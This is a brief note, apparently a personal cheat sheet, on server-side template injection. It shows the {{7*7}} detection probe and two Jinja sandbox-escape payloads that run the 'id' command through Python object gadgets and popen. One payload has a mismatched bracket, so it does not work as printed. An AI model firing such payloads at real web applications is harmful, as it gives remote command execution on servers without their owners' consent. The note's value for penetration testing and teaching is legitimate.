# Server side template injection
 
A very common way to identify if a web page is vulnerable to SSTI is to try and input the expression '{{7*7}}'

If the server returns 49, you know the server interprets the code.

Some frameworks have security trying to prevent users from doing malicious stuff.

Jinga for example will prevent the user from using this payload:

    {{ import os;os.system('id') }}
    
Thanks jinja.

workaround:

    {{ .__class__.__base__.__subclasses__()[141].__init__.__globals__['sys'].modules['os'.popen("id").read() }}
    
or

    {{ url_for.__globals__.os.popen("id").read() }}
    
Gadgets. In python, everything is an object.

